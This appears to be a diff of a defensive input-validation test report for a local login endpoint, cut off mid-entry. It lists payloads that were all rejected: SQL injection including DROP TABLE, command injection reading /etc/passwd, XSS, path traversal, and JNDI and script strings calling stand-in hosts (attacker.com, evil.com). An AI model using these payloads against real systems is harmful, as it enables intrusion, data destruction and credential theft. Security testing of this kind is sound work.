@@ -1,120 +1,1357 @@
 
 ========================================================================================
 SECURITY & DEFENSIVE INPUT VALIDATION TEST REPORT
-Endpoint: http://localhost:8080/test-login (Method: POST)
-Session Started: 2026-10-08 11:32:34.670
+Target: http://localhost:8080/auth/test-login (Method: POST)
+Parameters Audited: @RequestParam("bioId") Long, @RequestParam("password") String
+Session Started: 2026-10-08 11:46:13.180
 ========================================================================================
-TIMESTAMP               | RESULT | STATUS     | TIME     | CATEGORY           | PAYLOAD & DETAILS
 ----------------------------------------------------------------------------------------
-2026-10-08 11:32:37.950 | PASS   | HTTP 404   | 3262  ms | Content-Type       | Payload: "Raw JSON payload" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:38.034 | PASS   | HTTP 404   | 62    ms | Transport/QueryParam | Payload: "SQLi in queryParam" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:38.103 | PASS   | HTTP 404   | 61    ms | Tampering          | Payload: "Extra admin parameters injected" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:38.140 | PASS   | HTTP 404   | 32    ms | Missing Param      | Payload: "password omitted from request" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:38.322 | PASS   | HTTP 404   | 134   ms | Boundary/bioId     | Payload: "bioId=-1" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:38.615 | PASS   | HTTP 404   | 283   ms | Boundary/bioId     | Payload: "bioId=-999999" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:38.680 | PASS   | HTTP 404   | 61    ms | Boundary/bioId     | Payload: "bioId=0" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:38.724 | PASS   | HTTP 404   | 40    ms | Boundary/bioId     | Payload: "bioId=" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:38.782 | PASS   | HTTP 404   | 51    ms | Invalid Type/bioId | Payload: "bioId=invalidBioId" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:38.833 | PASS   | HTTP 404   | 47    ms | Invalid Type/bioId | Payload: "bioId=abc123" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:38.875 | PASS   | HTTP 404   | 37    ms | Invalid Type/bioId | Payload: "bioId=true" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:38.957 | PASS   | HTTP 404   | 77    ms | Invalid Type/bioId | Payload: "bioId=1234.5678" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.002 | PASS   | HTTP 404   | 41    ms | Invalid Type/bioId | Payload: "bioId=NaN" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.037 | PASS   | HTTP 404   | 32    ms | Invalid Type/bioId | Payload: "bioId=Infinity" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.146 | PASS   | HTTP 404   | 105   ms | Invalid Type/bioId | Payload: "bioId=!@#$%^&*()" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.191 | PASS   | HTTP 404   | 41    ms | Invalid Type/bioId | Payload: "bioId=1001 2002" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.226 | PASS   | HTTP 404   | 31    ms | Invalid Type/bioId | Payload: "bioId=0x7B" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.262 | PASS   | HTTP 404   | 33    ms | Invalid Type/bioId | Payload: "bioId=99999999999999999999999999999... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.294 | PASS   | HTTP 404   | 25    ms | Missing Param      | Payload: "Both bioId & password omitted" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.341 | PASS   | HTTP 404   | 35    ms | Missing Param      | Payload: "bioId omitted from request" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.373 | PASS   | HTTP 404   | 27    ms | Boundary/LongString | Payload: "1,000 char string" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.443 | PASS   | HTTP 404   | 67    ms | Boundary/LongString | Payload: "65,536 char string (64KB)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.476 | PASS   | HTTP 404   | 28    ms | Malformed/JSON     | Payload: "{"bioId": 1001, "password": "secret... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.590 | PASS   | HTTP 404   | 99    ms | Malformed/JSON     | Payload: "{"admin": true}" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.632 | PASS   | HTTP 404   | 38    ms | Malformed/JSON     | Payload: "{"$gt": ""}" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.674 | PASS   | HTTP 404   | 38    ms | Malformed/JSON     | Payload: "{"$ne": null}" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.732 | PASS   | HTTP 404   | 55    ms | Malformed/JSON     | Payload: "[1, 2, 3]" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.772 | PASS   | HTTP 404   | 37    ms | Malformed/JSON     | Payload: "{"bioId": [1, 2], "role": "ADMIN"}" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.802 | PASS   | HTTP 404   | 27    ms | Malformed/JSON     | Payload: "true" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.831 | PASS   | HTTP 404   | 25    ms | Malformed/JSON     | Payload: "null" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.858 | PASS   | HTTP 404   | 23    ms | Boundary/Empty     | Payload: "Empty password string """ -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.886 | PASS   | HTTP 404   | 25    ms | Format/Traversal   | Payload: "%s%s%s%s%s%n%x%d" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.910 | PASS   | HTTP 404   | 22    ms | Format/Traversal   | Payload: "%00" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.937 | PASS   | HTTP 404   | 22    ms | Format/Traversal   | Payload: "../../../../../../etc/passwd" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.965 | PASS   | HTTP 404   | 25    ms | Format/Traversal   | Payload: "..\..\..\..\windows\system32\config... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:39.990 | PASS   | HTTP 404   | 22    ms | Format/Traversal   | Payload: "${jndi:ldap://attacker.com/maliciou... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.021 | PASS   | HTTP 404   | 26    ms | Format/Traversal   | Payload: "${7*7}" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.049 | PASS   | HTTP 404   | 24    ms | Format/Traversal   | Payload: "#{7*7}" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.081 | PASS   | HTTP 404   | 27    ms | Unicode/Encoding   | Payload: "🔥🔒🚀👻🛡️" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.109 | PASS   | HTTP 404   | 23    ms | Unicode/Encoding   | Payload: "こんにちは世界" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.136 | PASS   | HTTP 404   | 23    ms | Unicode/Encoding   | Payload: "مرحبا بالعالم" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.162 | PASS   | HTTP 404   | 22    ms | Unicode/Encoding   | Payload: "Здравствуйте" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.194 | PASS   | HTTP 404   | 27    ms | Unicode/Encoding   | Payload: "admin password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.218 | PASS   | HTTP 404   | 22    ms | Unicode/Encoding   | Payload: "‮reversed_password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.252 | PASS   | HTTP 404   | 30    ms | Unicode/Encoding   | Payload: "test﻿password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.278 | PASS   | HTTP 404   | 22    ms | Unicode/Encoding   | Payload: "§±!@#$%^&*()_+-=[]{}|;':",./<>?`~" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.310 | PASS   | HTTP 404   | 29    ms | Boundary/Whitespace | Payload: "Whitespace-only password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.351 | PASS   | HTTP 404   | 38    ms | Boundary/Whitespace | Payload: "Whitespace-only password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.382 | PASS   | HTTP 404   | 27    ms | Boundary/Whitespace | Payload: "Whitespace-only password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.407 | PASS   | HTTP 404   | 22    ms | Boundary/Whitespace | Payload: "Whitespace-only password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.431 | PASS   | HTTP 404   | 20    ms | Boundary/Whitespace | Payload: "Whitespace-only password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.473 | PASS   | HTTP 404   | 39    ms | Boundary/Whitespace | Payload: "Whitespace-only password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.518 | PASS   | HTTP 404   | 42    ms | Boundary/LongString | Payload: "9,600 char string" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.563 | PASS   | HTTP 404   | 39    ms | Command Injection  | Payload: "; whoami" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.592 | PASS   | HTTP 404   | 25    ms | Command Injection  | Payload: "$(whoami)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.616 | PASS   | HTTP 404   | 21    ms | Command Injection  | Payload: "& whoami" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.643 | PASS   | HTTP 404   | 22    ms | Command Injection  | Payload: "| whoami" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.671 | PASS   | HTTP 404   | 22    ms | Command Injection  | Payload: "&& whoami" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.703 | PASS   | HTTP 404   | 23    ms | Command Injection  | Payload: "|| whoami" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.726 | PASS   | HTTP 404   | 20    ms | Command Injection  | Payload: "; id" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.742 | PASS   | HTTP 404   | 10    ms | Command Injection  | Payload: "| id" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.780 | PASS   | HTTP 404   | 22    ms | Command Injection  | Payload: "; cat /etc/passwd" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.808 | PASS   | HTTP 404   | 23    ms | Command Injection  | Payload: "& type C:\Windows\System32\drivers\... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.842 | PASS   | HTTP 404   | 28    ms | Command Injection  | Payload: "`whoami`" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.867 | PASS   | HTTP 404   | 20    ms | Command Injection  | Payload: "& dir" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.893 | PASS   | HTTP 404   | 22    ms | Command Injection  | Payload: "; dir" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.909 | PASS   | HTTP 404   | 11    ms | Command Injection  | Payload: "| dir" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.940 | PASS   | HTTP 404   | 20    ms | Command Injection  | Payload: "$(sleep 5)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.959 | PASS   | HTTP 404   | 16    ms | Command Injection  | Payload: "| echo vulnerable" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:40.978 | PASS   | HTTP 404   | 14    ms | Command Injection  | Payload: "; uname -a" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.019 | PASS   | HTTP 404   | 33    ms | Command Injection  | Payload: "& calc.exe" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.044 | PASS   | HTTP 404   | 19    ms | Command Injection  | Payload: "| net user" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.072 | PASS   | HTTP 404   | 17    ms | Command Injection  | Payload: "bioId=; whoami" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.095 | PASS   | HTTP 404   | 20    ms | Command Injection  | Payload: "bioId=$(whoami)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.119 | PASS   | HTTP 404   | 21    ms | Command Injection  | Payload: "bioId=& dir" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.142 | PASS   | HTTP 404   | 19    ms | Command Injection  | Payload: "bioId=| id" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.170 | PASS   | HTTP 404   | 23    ms | XSS Injection      | Payload: "<script>alert(1)</script>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.193 | PASS   | HTTP 404   | 20    ms | XSS Injection      | Payload: "<script>alert('XSS')</script>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.214 | PASS   | HTTP 404   | 18    ms | XSS Injection      | Payload: "<img src=x onerror=alert(1)>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.236 | PASS   | HTTP 404   | 20    ms | XSS Injection      | Payload: "javascript:alert(1)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.259 | PASS   | HTTP 404   | 19    ms | XSS Injection      | Payload: "<svg onload=alert(1)>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.281 | PASS   | HTTP 404   | 18    ms | XSS Injection      | Payload: "<body onload=alert('XSS')>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.307 | PASS   | HTTP 404   | 22    ms | XSS Injection      | Payload: ""><script src=http://evil.com/x.js>... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.330 | PASS   | HTTP 404   | 20    ms | XSS Injection      | Payload: "<iframe src="javascript:alert(1)"><... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.358 | PASS   | HTTP 404   | 26    ms | XSS Injection      | Payload: "<input type="text" autofocus onfocu... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.391 | PASS   | HTTP 404   | 30    ms | XSS Injection      | Payload: ""><svg/onload=confirm(1)>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.414 | PASS   | HTTP 404   | 20    ms | XSS Injection      | Payload: "';alert(String.fromCharCode(88,83,8... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.439 | PASS   | HTTP 404   | 22    ms | XSS Injection      | Payload: "<a href="javascript:alert(1)">Click... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.465 | PASS   | HTTP 404   | 22    ms | XSS Injection      | Payload: "bioId=<script>alert(1)</script>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.491 | PASS   | HTTP 404   | 24    ms | XSS Injection      | Payload: "bioId=<img src=x onerror=alert(1)>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.516 | PASS   | HTTP 404   | 19    ms | SQL Injection      | Payload: "bioId=1 OR 1=1" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.540 | PASS   | HTTP 404   | 21    ms | SQL Injection      | Payload: "bioId=' OR '1'='1" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.567 | PASS   | HTTP 404   | 23    ms | SQL Injection      | Payload: "bioId=1; DROP TABLE users;--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.592 | PASS   | HTTP 404   | 23    ms | SQL Injection      | Payload: "bioId=1 UNION SELECT null, null--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.616 | PASS   | HTTP 404   | 22    ms | SQL Injection      | Payload: "bioId=1001' OR '1'='1" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.643 | PASS   | HTTP 404   | 23    ms | SQL Injection      | Payload: "' OR '1'='1" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.670 | PASS   | HTTP 404   | 24    ms | SQL Injection      | Payload: "' OR 1=1--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.695 | PASS   | HTTP 404   | 22    ms | SQL Injection      | Payload: "admin' --" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.717 | PASS   | HTTP 404   | 20    ms | SQL Injection      | Payload: "'; DROP TABLE users;--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.744 | PASS   | HTTP 404   | 24    ms | SQL Injection      | Payload: "'; DELETE FROM accounts;--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.771 | PASS   | HTTP 404   | 23    ms | SQL Injection      | Payload: "' UNION SELECT null, null, null--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.796 | PASS   | HTTP 404   | 22    ms | SQL Injection      | Payload: "1' ORDER BY 1--+" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.824 | PASS   | HTTP 404   | 26    ms | SQL Injection      | Payload: "admin' /*" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.849 | PASS   | HTTP 404   | 23    ms | SQL Injection      | Payload: "' OR 'x'='x" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.872 | PASS   | HTTP 404   | 21    ms | SQL Injection      | Payload: "") OR ("1"="1" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.896 | PASS   | HTTP 404   | 21    ms | SQL Injection      | Payload: "' OR '' = '" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.920 | PASS   | HTTP 404   | 21    ms | SQL Injection      | Payload: "'; WAITFOR DELAY '0:0:5'--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.944 | PASS   | HTTP 404   | 20    ms | SQL Injection      | Payload: "' OR SLEEP(5)--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.967 | PASS   | HTTP 404   | 21    ms | SQL Injection      | Payload: "'; pg_sleep(5)--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:41.989 | PASS   | HTTP 404   | 19    ms | SQL Injection      | Payload: "1' OR '1' = '1' /*" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:42.014 | PASS   | HTTP 404   | 22    ms | SQL Injection      | Payload: "' OR 1=1#" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
-2026-10-08 11:32:42.036 | PASS   | HTTP 404   | 20    ms | SQL Injection      | Payload: "admin' or '1'='1'#" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+[2026-10-08 11:46:15.377] [PASS] Category: Content-Type | Test: Raw JSON payload
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/json Body)
+    Request Params Sent:
+      * Content-Type   = application/json
+      * JSON Body Payload = {"bioId": 1001, "password": "' OR '1'='1"}
+  [RESPONSE]
+    Status Code:          HTTP 400 (2181 ms)
+    Response Body:        {"message":"Missing parameter.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:15.837] [PASS] Category: Transport/QueryParam | Test: SQLi in queryParam
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (Query Parameters in URL)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ' OR '1'='1'
+  [RESPONSE]
+    Status Code:          HTTP 400 (429 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:15.904] [PASS] Category: Tampering | Test: Extra admin parameters injected
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = InvalidAttempt123!
+      * role           = SUPERADMIN
+      * auth_override  = 1
+      * isAdmin        = true
+  [RESPONSE]
+    Status Code:          HTTP 400 (57 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:15.976] [PASS] Category: Missing Param | Test: password omitted from request
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = [OMITTED / NOT SENT]
+  [RESPONSE]
+    Status Code:          HTTP 400 (65 ms)
+    Response Body:        {"message":"Missing parameter.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:16.062] [PASS] Category: Boundary/bioId | Test: bioId=-1
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = -1
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (39 ms)
+    Response Body:        {"message":"Invalid bioId","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:16.094] [PASS] Category: Boundary/bioId | Test: bioId=-999999
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = -999999
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (25 ms)
+    Response Body:        {"message":"Invalid bioId","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:16.130] [PASS] Category: Boundary/bioId | Test: bioId=0
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 0
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (27 ms)
+    Response Body:        {"message":"Invalid bioId","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:16.186] [PASS] Category: Boundary/bioId | Test: bioId=
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (52 ms)
+    Response Body:        {"message":"Missing parameter.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:16.250] [PASS] Category: Invalid Type/bioId | Test: bioId=invalidBioId
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = invalidBioId
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (53 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:16.291] [PASS] Category: Invalid Type/bioId | Test: bioId=abc123
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = abc123
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (36 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:16.336] [PASS] Category: Invalid Type/bioId | Test: bioId=true
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = true
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (37 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:16.374] [PASS] Category: Invalid Type/bioId | Test: bioId=1234.5678
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1234.5678
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (33 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:16.420] [PASS] Category: Invalid Type/bioId | Test: bioId=NaN
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = NaN
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (40 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:16.464] [PASS] Category: Invalid Type/bioId | Test: bioId=Infinity
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = Infinity
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (37 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:16.503] [PASS] Category: Invalid Type/bioId | Test: bioId=!@#$%^&*()
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = !@#$%^&*()
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (35 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:16.664] [PASS] Category: Invalid Type/bioId | Test: bioId=1001 2002
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001 2002
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (157 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.036] [PASS] Category: Invalid Type/bioId | Test: bioId=0x7B
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 0x7B
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (369 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.077] [PASS] Category: Invalid Type/bioId | Test: bioId=99999999999999999999999999999999999999999999999999999999999
+  [REQUEST]
